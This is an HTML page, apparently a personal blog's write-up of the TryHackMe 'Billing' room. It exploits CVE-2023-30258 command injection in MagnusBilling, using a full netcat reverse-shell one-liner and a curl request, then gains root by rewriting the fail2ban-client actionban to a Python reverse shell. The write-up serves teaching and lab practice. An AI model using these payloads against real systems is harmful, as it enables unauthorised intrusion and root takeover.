@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Billing Write-up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-body: #121212;
+            --bg-card: #1e1e1e;
+            --bg-sidebar: #181818;
+            --text-main: #e0e0e0;
+            --text-muted: #a0a0a0;
+            --accent: #00bcd4;
+            --accent-hover: #008ba3;
+            --border: #333333;
+            --code-bg: #2d2d2d;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            display: flex;
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .sidebar {
+            width: 300px;
+            background-color: var(--bg-sidebar);
+            border-right: 1px solid var(--border);
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+        }
+
+        .sidebar-nav {
+            margin-top: 40px;
+            width: 100%;
+        }
+
+        .back-link {
+            display: block;
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            margin-bottom: 20px;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: #fff;
+        }
+
+        .article-content {
+            flex: 1;
+            padding: 50px 80px;
+            overflow-y: auto;
+            line-height: 1.8;
+        }
+
+        .machine-info,
+        .toc {
+            width: 100%;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .machine-info h3,
+        .toc h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .machine-info ul,
+        .toc ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .machine-info li {
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            text-decoration: none;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            transition: color 0.2s, padding-left 0.2s;
+            display: block;
+        }
+
+        .toc a:hover {
+            color: var(--accent);
+            padding-left: 5px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+
+        p {
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            border: 1px solid var(--border);
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff79c6;
+        }
+
+        .cmd-output {
+            color: #8be9fd;
+        }
+
+        img.screenshot {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .meta-tags {
+            margin-bottom: 40px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .tag {
+            background-color: var(--bg-card);
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-right: 10px;
+            border: 1px solid var(--border);
+        }
+
+        @media (max-width: 768px) {
+            .app-container {
+                flex-direction: column;
+            }
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+            }
+            .article-content {
+                padding: 30px 20px;
+            }
+        }
+
+        .tools-section {
+            width: 100%;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .tools-section h3 {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .tool-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .tool-badge {
+            background-color: #252526;
+            color: #e0e0e0;
+            font-size: 0.8rem;
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            cursor: default;
+            transition: all 0.2s ease;
+        }
+
+        .tool-badge:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="sidebar-nav">
+                <a href="../index.html" class="back-link">← Back to Home</a>
+            </div>
+
+            <div class="machine-info">
+                <h3>Target Info</h3>
+                <ul>
+                    <li><strong>Name:</strong> Billing</li>
+                    <li><strong>Site:</strong> TryHackMe</li>
+                    <li><strong>OS:</strong> <span style="color: #ff79c6;">Linux</span></li>
+                    <li><strong>Difficulty:</strong> <span style="color: #50fa7b;">Easy</span></li>
+                </ul>
+            </div>
+
+            <div class="toc">
+                <h3>Table of Contents</h3>
+                <ul>
+                    <li><a href="#recon">1. Reconnaissance</a></li>
+                    <li><a href="#fingerprint">2. Software Fingerprinting</a></li>
+                    <li><a href="#exploit">3. Exploitation (CVE-2023-30258)</a></li>
+                    <li><a href="#user">4. User Flag</a></li>
+                    <li><a href="#privesc">5. Privilege Escalation</a></li>
+                </ul>
+            </div>
+            <div class="tools-section">
+                <h3>Tools Arsenal</h3>
+                <div class="tool-tags">
+                    <span class="tool-badge">Nmap</span>
+                    <span class="tool-badge">Github</span>
+                    <span class="tool-badge">Curl</span>
+                    <span class="tool-badge">Fail2Ban</span>
+                    <span class="tool-badge">Sudo</span>
+                </div>
+            </div>
+            <div style="text-align: center; color: var(--text-muted); margin-top: auto;">
+                <p>Created by <strong style="color: #fff;">Kontowsky</strong></p>
+            </div>
+        </aside>
+
+        <article class="article-content">
+
+            <h1>Billing</h1>
+            <div class="meta-tags">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">RCE</span>
+                <span class="tag">Fail2Ban</span>
+                <span class="tag">Dec 12, 2025</span>
+            </div>
+
+            <p>
+                In this write-up, we exploit a known vulnerability in MagnusBilling to gain initial access via command injection.
+                Then, we delve deep into a fascinating privilege escalation vector involving the manipulation of 
+                <code>fail2ban-client</code> to force the root process to execute our malicious code.
+		<br>Link to the room: <a href="https://tryhackme.com/room/billing" target="_blank">https://tryhackme.com/room/billing</a>
+            </p>
+
+            <h2 id="recon">1. Reconnaissance</h2>
+            <p>
+                We start with a standard Nmap scan to enumerate open ports.
+            </p>
+            <pre><code>$ sudo nmap -T4 10.80.176.111</code></pre>
+
+            <img src="images_billing/image-489.png" alt="Nmap Scan" class="screenshot">
+
+            <p>
+                The initial scan shows ports 22 (SSH), 80 (HTTP), and 3306 (MySQL).
+                Visiting port 80 reveals a login page, but we have no credentials.
+            </p>
+            <img src="images_billing/image-490.png" alt="Login Page" class="screenshot">
+
+            <p>
+                I ran a more thorough scan on all ports to ensure I didn't miss anything.
+            </p>
+            <pre><code>$ sudo nmap -T4 -p- 10.80.176.111
+$ sudo nmap -T4 -p5038 -sV 10.80.176.111</code></pre>
+
+            <img src="images_billing/image-491.png" alt="Port 5038 Scan" class="screenshot">
+
+            <p>
+                We found port <strong>5038</strong> running <strong>Asterisk Call Manager</strong>. This suggests the server is likely a VoIP system.
+            </p>
+
+            <h2 id="fingerprint">2. Software Fingerprinting</h2>
+            <p>
+                Using the directory names found by Gobuster and the context of "Asterisk", I searched for VoIP billing software. 
+                I compared the directory structure on the web server with open-source projects on GitHub.
+            </p>
+            <p>
+                I found a match: <strong>MagnusBilling 7</strong>. The README on GitHub matched the technology stack (Yii Framework, ExtJS).
+            </p>
+            <img src="images_billing/image-492.png" alt="MagnusBilling GitHub" class="screenshot">
+
+            <h2 id="exploit">3. Exploitation (CVE-2023-30258)</h2>
+            <p>
+                Searching for vulnerabilities for MagnusBilling 7, I found <strong>CVE-2023-30258</strong>. 
+                This is an unauthenticated Command Injection vulnerability in the <code>icepay.php</code> file.
+            </p>
+            <img src="images_billing/image-493.png" alt="Exploit Info" class="screenshot">
+
+            <p>
+                The exploit works by injecting commands into the <code>democ</code> parameter. I prepared a reverse shell payload:
+            </p>
+            <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.228 4444 >/tmp/f</code></pre>
+
+            <p>
+                I URL-encoded this payload and sent it via <code>curl</code> to the vulnerable endpoint:
+            </p>
+            <pre><code>curl -s 'http://10.80.176.111/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=...[payload]...'</code></pre>
+
+            <img src="images_billing/image-494.png" alt="Reverse Shell" class="screenshot">
+
+            <p>
+                It worked! I caught the shell as the user <code>asterisk</code>. I stabilized the shell using Python.
+            </p>
+            <img src="images_billing/image-495.png" alt="Shell Stabilization" class="screenshot">
+
+            <h2 id="user">4. User Flag</h2>
+            <p>
+                I checked the <code>/home</code> directory and found a user named <strong>magnus</strong>. 
+                Luckily, the permissions on his home directory allowed me to read the <code>user.txt</code> flag.
+            </p>
+            <img src="images_billing/image-496.png" alt="User Flag" class="screenshot">
+            <p>
+                <strong>User Flag:</strong> <code>THM[REDACTED]</code>
+            </p>
+
+            <h2 id="privesc">5. Privilege Escalation (Fail2Ban)</h2>
+            <p>
+                Now for the most interesting part. I checked sudo permissions for the <code>asterisk</code> user.
+            </p>
+            <pre><code>$ sudo -l</code></pre>
+
+            <img src="images_billing/image-497.png" alt="Sudo Permissions" class="screenshot">
+
+            <p>
+                We can run <code>/usr/bin/fail2ban-client</code> as <strong>root</strong> without a password.
+                This is extremely dangerous. Let me explain why.
+            </p>
+
+            <h3>How Fail2Ban Works (Client-Server Architecture)</h3>
+            <p>
+                Fail2Ban consists of two parts:
+                <ul>
+                    <li><strong>fail2ban-server</strong>: The main daemon that runs as <strong>root</strong>. It monitors logs and bans IPs by updating firewall rules (iptables).</li>
+                    <li><strong>fail2ban-client</strong>: A utility used to send commands to the server (e.g., "ban this IP", "change configuration").</li>
+                </ul>
+                Since we can run the <strong>client</strong> as root via sudo, we can send ANY configuration command to the <strong>server</strong> (which is already root).
+            </p>
+
+            <h3>The Attack Plan</h3>
+            <p>
+                Fail2Ban uses "actions" to define what to do when an IP gets banned (e.g., "run iptables"). 
+                We can overwrite this action to run "reverse shell" instead!
+            </p>
+
+            <p><strong>Step 1: Check Status</strong></p>
+            <p>
+                I listed the running jails to find an active one.
+            </p>
+            <pre><code>$ sudo /usr/bin/fail2ban-client status</code></pre>
+            <img src="images_billing/image-498.png" alt="Fail2Ban Status" class="screenshot">
+            <p>I chose the jail <code>asterisk-manager</code>.</p>
+
+            <p><strong>Step 2: Poison the Action</strong></p>
+            <p>
+                I told the Fail2Ban server to change the "actionban" for this jail. Instead of blocking a port, I want it to execute a Python reverse shell connecting to my new listener on port 4445.
+            </p>
+            <pre><code>RCE_CMD="python3 -c 'import socket,os,pty;s=socket.socket...[reverse shell]...'"
+
+sudo /usr/bin/fail2ban-client set asterisk-manager action iptables-allports-AST_MANAGER actionban "$RCE_CMD"</code></pre>
+            <img src="images_billing/image-501.png" alt="Poisoning Fail2Ban" class="screenshot">
+
+            <p><strong>Step 3: Trigger the Ban</strong></p>
+            <p>
+                Now the trap is set. I just need to "ban" an IP address to trigger the action. Since I control the client, I can manually tell the server to ban a fake IP (1.2.3.4).
+            </p>
+            <pre><code>$ sudo /usr/bin/fail2ban-client set asterisk-manager banip 1.2.3.4</code></pre>
+
+            <p>
+                The server received the command "ban 1.2.3.4". It looked up its configuration, saw that "actionban" is now my Python code, and executed it as <strong>ROOT</strong>.
+            </p>
+
+            <img src="images_billing/image-500.png" alt="Root Shell" class="screenshot">
+
+            <p>
+                I received a root shell on my listener and successfully read the final flag!
+            </p>
+            <p>
+                <strong>Root Flag:</strong> <code>THM[REDACTED]</code>
+            </p>
+
+        </article>
+    </div>
+<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "ed03f38c876b450aad0249d433086aae"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
